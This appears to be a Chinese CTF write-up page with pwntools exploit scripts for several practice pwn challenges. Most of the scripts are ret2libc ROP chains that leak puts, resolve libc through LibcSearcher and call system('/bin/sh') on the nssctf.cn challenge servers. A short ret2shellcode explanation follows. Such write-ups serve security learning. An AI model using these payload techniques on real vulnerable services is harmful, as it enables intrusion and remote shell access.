&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./shell&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local = 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if local ==0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = process(&amp;#x27;./shell&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28616)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret_addr = 0x400416 # ROPgadget --binary shell --only &amp;#x27;ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi_ret = 0x4005e3 # ROPgadget --binary shell --only &amp;#x27;pop|rdi|ret&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tips = 0x400541&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = elf.symbols[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;b&amp;#x27;*0x10+b&amp;#x27;b&amp;#x27;*8+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;find it?\n&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2021-新生赛whitegive_pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2021-新生赛whitegive_pwn&#34;&gt;#&lt;/a&gt; [SWPUCTF 2021 新生赛] whitegive_pwn&lt;/h5&gt;
&lt;p&gt;这个题的话和 babyof 的题差不多就是一个 ret2libc 的题但是这个题的 libc.so 有问题打不进去代码如下&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;quot;debug&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;program = &amp;quot;./Desktop/附件&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28406)#process(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;quot;puts&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = 0x400763&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_ret = 0x400509&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__start = 0x400570&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*(0x10+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u64(p.recvuntil(&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))  #\\接收puts的got地址因为栈地址一般是由\x7f开头的自动补全8位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts addr is %x&amp;#x27;%puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_addr) #\\利用puts_addr在LibcSearcher里面查找对映的库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = puts_addr-libc.dump(&amp;#x27;puts&amp;#x27;)  #\\利用puts_addr（动态地址）减去puts的函数偏移量即可得到libc的基地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh_str=libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;) #\\下面的得到基地址后都加上偏移量就能得到对应的函数了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;libc addr is %x&amp;#x27;%libc_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;bin_sh_str is %x&amp;#x27;%bin_sh_str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = b&amp;#x27;a&amp;#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\使用一个ret来跳转到pop_rdi然后就利用system(/bin/sh)即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还有个大佬用的裸 so 打进去的&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;, arch=&amp;#x27;amd64&amp;#x27;, log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28820)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def debug():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def get_addr():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x400763&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x18 + p64(rdi) + p64(elf.got[&amp;#x27;puts&amp;#x27;]) + p64(elf.sym[&amp;#x27;puts&amp;#x27;]) + p64(elf.sym[&amp;#x27;vuln&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = get_addr() - 0x06f6a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + 0x0453a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + 0x18ce57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x18 + p64(rdi) + p64(binsh) + p64(system) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;ciscn-2019东北pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn-2019东北pwn2&#34;&gt;#&lt;/a&gt; [CISCN 2019 东北] PWN2&lt;/h5&gt;
&lt;p&gt;这又是个 ret2libc 的体型直接打&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;quot;./pwn2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28652)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start=0x400790&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x4006b9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_ret=0x400c83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x58+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;choice!&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;encrypted&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr=u64(p.recvuntil(&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts addr is %x&amp;#x27;%puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr=puts_addr-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr=libc_addr+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str_bin_sh=libc_addr+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=b&amp;#x27;a&amp;#x27;*0x58+p64(ret)+p64(rdi_ret)+p64(str_bin_sh)+p64(system_addr)+p64(start)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;choice!&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;encrypted&amp;#x27;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;wustctf-2020getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wustctf-2020getshell&#34;&gt;#&lt;/a&gt; [WUSTCTF 2020]getshell&lt;/h5&gt;
&lt;p&gt;这个拿到 flag 后交不了&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28667)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr=0x804851B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x18+0x4)+p32(system_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023easy-pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023easy-pwn&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023]EASY PWN&lt;/h5&gt;
&lt;p&gt;本地运行发现多输入几位发现提示没有 flag.txt 可以猜到直接 nc 连接多输入几位即可得到 flag，虽然得到了 flag 但是还是要分析一下这个程序，使用 checksec 后可以查看这个开启了地址随机化那打开 ida 发现这个 main 调用 check 然后在调用 printflag，然后我们还是写个脚本&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;pwn&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28563)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ret2shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ret2shellcode&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ret2shellcode&lt;/h5&gt;
&lt;p&gt;这个题要注意 c 语言的几个函数 memset、strcpy、mprotect 其中 mprotect 是赋权限 strcpy 是复制然后 memset 是设置前面的字符替换为指定字符&lt;br /&gt;
按照题目标题的话我们直接写入 shellcode 造成溢出然后在调用 buff 函数即可，因为 shellcode 写入的话 strcpy 将我们写入的 shellcode 写入到了 buff 字段&lt;br /&gt;
 buff 字段可以直接去.bss 查看&lt;/p&gt;
